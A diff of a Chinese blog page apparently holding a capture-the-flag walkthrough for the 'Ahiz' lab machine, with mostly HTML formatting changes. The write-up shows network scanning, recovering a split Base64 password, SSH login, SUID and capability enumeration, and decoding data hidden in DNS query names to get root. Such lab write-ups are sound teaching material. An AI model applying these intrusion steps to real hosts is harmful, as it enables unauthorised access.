@@ -160,7 +160,7 @@ PORT   STATE SERVICE
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Ahiz.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Ahiz</title>
-
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
 
 </head>
@@ -184,7 +184,17 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
 </style>
 
 
@@ -219,23 +229,21 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>主机发现</h2>
 <p>使用 ARP 扫描发现局域网内的主机：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.162 08:00:27:43:89:a7       PCS Systemtechnik GmbH
-...
-</code></pre>
-<p>目标主机 IP：<code>192.168.205.162</code></p>
+...</pre></div>
+<p>目标主机 IP：<code class="notranslate">192.168.205.162</code></p>
 <h2>端口扫描</h2>
 <p>对目标主机进行全端口扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.162
 ...
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
-...
-</code></pre>
+...</pre></div>
 <p>发现开放端口：</p>
 <ul>
 <li>22/tcp：SSH 服务</li>
@@ -244,20 +252,19 @@ PORT   STATE SERVICE
 <h1>二、Web服务探测</h1>
 <h2>首页分析</h2>
 <p>访问目标站点：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ curl 192.168.205.162                                  
 ...
     🚪 这是一个非常简单的入口，密码我已经分成了好多串  快来获取吧welcome
-...
-</code></pre>
+...</pre></div>
 <p>关键信息：</p>
 <ol>
-<li>页面提到&quot;密码我已经分成了好多串&quot;</li>
-<li>最后有&quot;welcome&quot;，可能是用户名提示</li>
+<li>页面提到"密码我已经分成了好多串"</li>
+<li>最后有"welcome"，可能是用户名提示</li>
 </ol>
 <h2>目录扫描</h2>
 <p>使用 dirsearch 进行目录和文件扫描：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ dirsearch -u http://192.168.205.162    
 ...
 [11:25:17] 200 -    4B  - /1.php
@@ -268,49 +275,45 @@ PORT   STATE SERVICE
 [11:25:17] 200 -    4B  - /6.php
 [11:25:17] 200 -    4B  - /7.php
 [11:25:17] 200 -    4B  - /8.php
-[11:25:17] 200 -    4B  - /9.php
-</code></pre>
-<p>发现编号为 1-9 的 PHP 文件，结合首页提到的&quot;密码分成好多串&quot;，推测需要访问这些文件获取密码片段。</p>
+[11:25:17] 200 -    4B  - /9.php</pre></div>
+<p>发现编号为 1-9 的 PHP 文件，结合首页提到的"密码分成好多串"，推测需要访问这些文件获取密码片段。</p>
 <h2>密码片段收集</h2>
 <p>使用循环脚本批量访问数字编号的 PHP 文件：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ for i in {1..100}; do curl -s &quot;http://192.168.205.162/${i}.php&quot;; done|head -n 1
-Vm0weGQxSXhWWGhTV0d4VFYwZG9WVll3WkRSWFJteDBaVVYwVjJKR2JETlpWVlpQWVVaS2MxZHVhRmRTTTJoUVZtMXplRll4WkhWaVJtUnBWMGRvZVZaclVrZFpWMDE0Vkc1T1dHSkdjSEJXYTFwaFpWWmFjVk5xVWxwV01VcElWbTAxVjJGc1NuVlJiVGxhVjBoQ1dGUlhlR0ZqYkd0NllVWk9UbUY2VmpWV1JscFhWakpHU0ZadVJsSldSM005&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">for</span> <span class="pl-smi">i</span> <span class="pl-k">in</span> {1..100}<span class="pl-k">;</span> <span class="pl-k">do</span> curl -s <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.162/<span class="pl-smi">${i}</span>.php<span class="pl-pds">"</span></span><span class="pl-k">;</span> done<span class="pl-k">|</span>head -n 1
+Vm0weGQxSXhWWGhTV0d4VFYwZG9WVll3WkRSWFJteDBaVVYwVjJKR2JETlpWVlpQWVVaS2MxZHVhRmRTTTJoUVZtMXplRll4WkhWaVJtUnBWMGRvZVZaclVrZFpWMDE0Vkc1T1dHSkdjSEJXYTFwaFpWWmFjVk5xVWxwV01VcElWbTAxVjJGc1NuVlJiVGxhVjBoQ1dGUlhlR0ZqYkd0NllVWk9UbUY2VmpWV1JscFhWakpHU0ZadVJsSldSM<span class="pl-k">005&lt;</span><span class="pl-k">!</span>DOCTYPE HTML PUBLIC <span class="pl-s"><span class="pl-pds">"</span>-//IETF//DTD HTML 2.0//EN<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span></pre></div>
 <p>获得一个 Base64 编码的字符串：</p>
-<pre><code>Vm0weGQxSXhWWGhTV0d4VFYwZG9WVll3WkRSWFJteDBaVVYwVjJKR2JETlpWVlpQWVVaS2MxZHVhRmRTTTJoUVZtMXplRll4WkhWaVJtUnBWMGRvZVZaclVrZFpWMDE0Vkc1T1dHSkdjSEJXYTFwaFpWWmFjVk5xVWxwV01VcElWbTAxVjJGc1NuVlJiVGxhVjBoQ1dGUlhlR0ZqYkd0NllVWk9UbUY2VmpWV1JscFhWakpHU0ZadVJsSldSM005
+<pre class="notranslate"><code class="notranslate">Vm0weGQxSXhWWGhTV0d4VFYwZG9WVll3WkRSWFJteDBaVVYwVjJKR2JETlpWVlpQWVVaS2MxZHVhRmRTTTJoUVZtMXplRll4WkhWaVJtUnBWMGRvZVZaclVrZFpWMDE0Vkc1T1dHSkdjSEJXYTFwaFpWWmFjVk5xVWxwV01VcElWbTAxVjJGc1NuVlJiVGxhVjBoQ1dGUlhlR0ZqYkd0NllVWk9UbUY2VmpWV1JscFhWakpHU0ZadVJsSldSM005
 </code></pre>
 <h1>三、密码解码</h1>
 <p>使用 CyberChef 对获取的 Base64 字符串进行解码：</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250907132652461.webp" alt="image-20250906192653359" /></p>
-<p>解码结果：<code>passwd@123ZZZZ123</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/edaaf023d039c9e78b39637072129ffaacbf8aaad415350195341a7db967edf5/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303930373133323635323436312e77656270"><img src="https://camo.githubusercontent.com/edaaf023d039c9e78b39637072129ffaacbf8aaad415350195341a7db967edf5/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303930373133323635323436312e77656270" alt="image-20250906192653359" data-canonical-src="http://7r1UMPHK.github.io/image/20250907132652461.webp" style="max-width: 100%;"></a></p>
+<p>解码结果：<code class="notranslate">passwd@123ZZZZ123</code></p>
 <h1>四、SSH登录</h1>
 <p>使用获得的凭据进行 SSH 登录：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh welcome@192.168.205.162
-The authenticity of host '192.168.205.162 (192.168.205.162)' can't be established.
-...
-welcome@192.168.205.162's password: 
-Linux Ahiz 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.162 (192.168.205.162)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
+<span class="pl-s">...</span>
+<span class="pl-s">welcome@192.168.205.162<span class="pl-pds">'</span></span>s password: 
+Linux Ahiz 4.19.0-27-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
 ...
 Last login: Thu Sep  4 04:17:40 2025 from 192.168.31.186
-welcome@Ahiz:~$ id
-uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
-</code></pre>
-<p>成功登录系统，用户名：<code>welcome</code>，密码：<code>passwd@123ZZZZ123</code></p>
+welcome@Ahiz:<span class="pl-k">~</span>$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
+<p>成功登录系统，用户名：<code class="notranslate">welcome</code>，密码：<code class="notranslate">passwd@123ZZZZ123</code></p>
 <h1>五、权限提升</h1>
 <h2>系统信息收集</h2>
 <p>检查当前用户权限和系统信息：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ sudo -l
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ sudo -l
 -bash: /usr/bin/sudo: Permission denied
-welcome@Ahiz:~$ which sudo
-welcome@Ahiz:~$ ls -al /usr/bin/sudo
--rwxr-x--- 1 root root 182600 Jan 14  2023 /usr/bin/sudo
-</code></pre>
+welcome@Ahiz:<span class="pl-k">~</span>$ which sudo
+welcome@Ahiz:<span class="pl-k">~</span>$ ls -al /usr/bin/sudo
+-rwxr-x--- 1 root root 182600 Jan 14  2023 /usr/bin/sudo</pre></div>
 <p>sudo 命令被限制使用，需要寻找其他提权方式。</p>
 <h2>SUID二进制文件检查</h2>
 <p>检查系统中的 SUID 文件：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ find / -perm -4000 -type f -exec ls -l {} <span class="pl-cce">\;</span> <span class="pl-k">2&gt;</span>/dev/null
 -rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
 -rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
 -rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
@@ -320,12 +323,11 @@ welcome@Ahiz:~$ ls -al /usr/bin/sudo
 -rwsr-xr-x 1 root root 34888 Apr  6  2024 /usr/bin/umount
 -rwsr-xr-x 1 root root 23448 Jan 13  2022 /usr/bin/pkexec
 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-...
-</code></pre>
+...</pre></div>
 <p>发现系统中存在标准的 SUID 文件，但未发现明显的可利用文件。</p>
 <h2>用户可访问文件检查</h2>
 <p>查找当前用户可访问的文件：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ find / -user <span class="pl-s"><span class="pl-pds">$(</span>whoami<span class="pl-pds">)</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/proc/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/sys/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/run/*<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
 /dev/pts/0
 /usr/local/bin/irc_bot.py
 /home/welcome
@@ -334,98 +336,86 @@ welcome@Ahiz:~$ ls -al /usr/bin/sudo
 /home/welcome/.bash_history
 /home/welcome/.zsh_history
 /home/welcome/.xterminal
-...
-</code></pre>
+...</pre></div>
 <h2>Capabilities检查</h2>
 <p>检查是否有设置特殊 capabilities 的文件：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ getcap -r / 2&gt;/dev/null
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ getcap -r / <span class="pl-k">2&gt;</span>/dev/null</pre></div>
 <p>未发现可利用的 capabilities。</p>
 <h2>网络服务检查</h2>
 <p>检查系统网络服务：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ ss -tulnp
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ ss -tulnp
 Netid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port             
-udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                
-tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                
-tcp                 LISTEN               0                    128                                            *:80                                            *:*                
-tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                
-</code></pre>
+udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:<span class="pl-k">*</span>                
+tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:<span class="pl-k">*</span>                
+tcp                 LISTEN               0                    128                                            <span class="pl-k">*</span>:80                                            <span class="pl-k">*</span>:<span class="pl-k">*</span>                
+tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:<span class="pl-k">*</span>                </pre></div>
 <h2>重要文件发现</h2>
-<p>检查 <code>/opt</code> 目录发现可疑文件：</p>
-<pre lang="bash"><code>welcome@Ahiz:~$ cd /opt/
+<p>检查 <code class="notranslate">/opt</code> 目录发现可疑文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /opt/
 welcome@Ahiz:/opt$ ls -al
 total 52
-drwxr-xr-x  2 root root  4096 Sep  4 04:18 .
+drwxr-xr-x  2 root root  4096 Sep  4 04:18 <span class="pl-c1">.</span>
 drwxr-xr-x 18 root root  4096 Sep  3 13:12 ..
--rw-r--r--  1 root root 42249 Sep  4 02:56 dns_data.pcap
-</code></pre>
-<p>发现一个网络抓包文件 <code>dns_data.pcap</code>。</p>
+-rw-r--r--  1 root root 42249 Sep  4 02:56 dns_data.pcap</pre></div>
+<p>发现一个网络抓包文件 <code class="notranslate">dns_data.pcap</code>。</p>
 <h1>六、流量分析</h1>
 <h2>抓包文件传输</h2>
 <p>将抓包文件传输到本地进行分析：</p>
-<pre lang="bash"><code>welcome@Ahiz:/opt$ scp dns_data.pcap kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:/opt$ scp dns_data.pcap kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
 ...
-dns_data.pcap                                                                                                                                   100%   41KB   8.2MB/s   00:00 
-</code></pre>
+dns_data.pcap                                                                                                                                   100%   41KB   8.2MB/s   00:00 </pre></div>
 <h2>DNS流量分析</h2>
 <p>使用 tshark 分析 DNS 流量：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ tshark -r dns_data.pcap                            
     1   0.000000 192.168.31.90 → 8.8.8.8      DNS 59 Standard query 0x0000 A 5.example.com
     2   0.000266 192.168.31.90 → 8.8.8.8      DNS 59 Standard query 0x0000 A 6.example.com
     3   0.000410 192.168.31.90 → 8.8.8.8      DNS 59 Standard query 0x0000 A  .example.com
     4   0.000545 192.168.31.90 → 8.8.8.8      DNS 59 Standard query 0x0000 A 6.example.com
     5   0.000674 192.168.31.90 → 8.8.8.8      DNS 59 Standard query 0x0000 A d.example.com
-...
-</code></pre>
+...</pre></div>
 <p>观察发现这些 DNS 查询的子域名都是十六进制字符（0-9, a-f），这表明可能隐藏了一些数据。</p>
 <h2>数据提取</h2>
 <h3>方法一：使用 tshark 过滤并拼接</h3>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ tshark -r dns_data.pcap -T fields -e dns.qry.name | grep -v &quot;^\s*\.example\.com$&quot; | sed 's/\.example\.com//' | tr -d '\n' 
-566d30786431497856586853574778545630646f565659775a445258526d78305a55563056324a4762444e5a56565a5059555a4b63316475614664534d326851566d317a654659785a485669526d52705630646f65565a72556b645a563031345647354f57474a476346685556455a4c5a565a6b56316473576d78534d4456365632746f54324673536e5652626b4a61596b5a4b655670586547465762475279563278435632457763465257565670535a444643556c42554d44303d              
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ tshark -r dns_data.pcap -T fields -e dns.qry.name <span class="pl-k">|</span> grep -v <span class="pl-s"><span class="pl-pds">"</span>^\s*\.example\.com$<span class="pl-pds">"</span></span> <span class="pl-k">|</span> sed <span class="pl-s"><span class="pl-pds">'</span>s/\.example\.com//<span class="pl-pds">'</span></span> <span class="pl-k">|</span> tr -d <span class="pl-s"><span class="pl-pds">'</span>\n<span class="pl-pds">'</span></span> 
+566d30786431497856586853574778545630646f565659775a445258526d78305a55563056324a4762444e5a56565a5059555a4b63316475614664534d326851566d317a654659785a485669526d52705630646f65565a72556b645a563031345647354f57474a476346685556455a4c5a565a6b56316473576d78534d4456365632746f54324673536e5652626b4a61596b5a4b655670586547465762475279563278435632457763465257565670535a444643556c42554d44303d              </pre></div>
 <h3>方法二：使用 Perl 正则表达式（更简洁）</h3>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
-└─$ tshark -r dns_data.pcap | perl -ne 'print &quot;$1&quot; if /A (\w+)\.example\.com/' 
-566d30786431497856586853574778545630646f565659775a445258526d78305a55563056324a4762444e5a56565a5059555a4b63316475614664534d326851566d317a654659785a485669526d52705630646f65565a72556b645a563031345647354f57474a476346685556455a4c5a565a6b56316473576d78534d4456365632746f54324673536e5652626b4a61596b5a4b655670586547465762475279563278435632457763465257565670535a444643556c42554d44303d 
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ tshark -r dns_data.pcap <span class="pl-k">|</span> perl -ne <span class="pl-s"><span class="pl-pds">'</span>print "$1" if /A (\w+)\.example\.com/<span class="pl-pds">'</span></span> 
+566d30786431497856586853574778545630646f565659775a445258526d78305a55563056324a4762444e5a56565a5059555a4b63316475614664534d326851566d317a654659785a485669526d52705630646f65565a72556b645a563031345647354f57474a476346685556455a4c5a565a6b56316473576d78534d4456365632746f54324673536e5652626b4a61596b5a4b655670586547465762475279563278435632457763465257565670535a444643556c42554d44303d </pre></div>
 <h2>数据解码</h2>
 <p>将提取的十六进制数据转换为 ASCII 并进行 Base64 解码：</p>
-<p><img src="http://7r1UMPHK.github.io/image/20250907132650948.webp" alt="image-20250906193555111" /></p>
-<p>解码结果：<code>passwd@123Ahiz</code></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3bbd1a0c78367cbadff7bebc0bb0b83fb0ee3a2d5ee0c8f17347cd5700976f1d/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303930373133323635303934382e77656270"><img src="https://camo.githubusercontent.com/3bbd1a0c78367cbadff7bebc0bb0b83fb0ee3a2d5ee0c8f17347cd5700976f1d/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303930373133323635303934382e77656270" alt="image-20250906193555111" data-canonical-src="http://7r1UMPHK.github.io/image/20250907132650948.webp" style="max-width: 100%;"></a></p>
+<p>解码结果：<code class="notranslate">passwd@123Ahiz</code></p>
 <h1>七、获取Root权限</h1>
 <p>使用从流量分析中获得的密码切换到 root 用户：</p>
-<pre lang="bash"><code>welcome@Ahiz:/opt$ su -
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Ahiz:/opt$ su -
 Password: 
-root@Ahiz:~# id
+root@Ahiz:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
 uid=0(root) gid=0(root) groups=0(root)
-root@Ahiz:~# cat /root/root.txt 
-flag{root}
-</code></pre>
-<p>成功获取 root 权限，并且获得rootflag，但是没想到啊，ahiz把userflag放Ahiz家目录下的<code>1</code>里面了（因为我都是先找提权的）</p>
+root@Ahiz:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt </span>
+flag{root}</pre></div>
+<p>成功获取 root 权限，并且获得rootflag，但是没想到啊，ahiz把userflag放Ahiz家目录下的<code class="notranslate">1</code>里面了（因为我都是先找提权的）</p>
 <h1>八、用户Flag获取</h1>
 <h2>发现可执行文件</h2>
 <p>在 welcome 用户的家目录下发现一个可执行文件：</p>
-<pre lang="bash"><code>root@Ahiz:~# cd /home/welcome/
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Ahiz:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cd /home/welcome/</span>
 root@Ahiz:/home/welcome# ls -al 1 
 -rwxr-xr-x 1 root root 5348952 Sep  4 02:14 1
 root@Ahiz:/home/welcome# file 1 
-1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=81544629ae0a32249a48b0bc5134fb7b1455adea, stripped
-</code></pre>
+1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="pl-k">for</span> GNU/Linux 3.2.0, BuildID[sha1]=81544629ae0a32249a48b0bc5134fb7b1455adea, stripped</pre></div>
 <p>这是一个 64 位的 Linux 可执行文件，我反编看了一下，里面的flag不是明文，是py加载出来的，所以执行试试。</p>
 <h2>程序执行</h2>
 <p>尝试运行该程序：</p>
-<pre lang="bash"><code>root@Ahiz:/home/welcome# ./1 
-Usage: ./1 &lt;string&gt;大于密码长度
-root@Ahiz:/home/welcome# ./1 $(seq 1000)
-Usage: ./1 &lt;string&gt;大于密码长度
-root@Ahiz:/home/welcome# ./1 &quot;$(seq 1000)&quot;
-✅ Good job! Here is your flag:
-user_FLAG{this_is_a_safe_demo_flag}
-</code></pre>
-<p>通过向程序传入足够长的字符串参数，成功获取用户 flag！</p>
-</div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Ahiz:/home/welcome# ./1 
+Usage: ./1 <span class="pl-k">&lt;</span>string<span class="pl-k">&gt;</span>大于密码长度
+root@Ahiz:/home/welcome# ./1 <span class="pl-s"><span class="pl-pds">$(</span>seq 1000<span class="pl-pds">)</span></span>
+Usage: ./1 <span class="pl-k">&lt;</span>string<span class="pl-k">&gt;</span>大于密码长度
+root@Ahiz:/home/welcome# ./1 <span class="pl-s"><span class="pl-pds">"</span><span class="pl-s"><span class="pl-pds">$(</span>seq 1000<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span>
+✅ Good job<span class="pl-k">!</span> Here is your flag:
+user_FLAG{this_is_a_safe_demo_flag}</pre></div>
+<p>通过向程序传入足够长的字符串参数，成功获取用户 flag！</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -450,7 +440,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 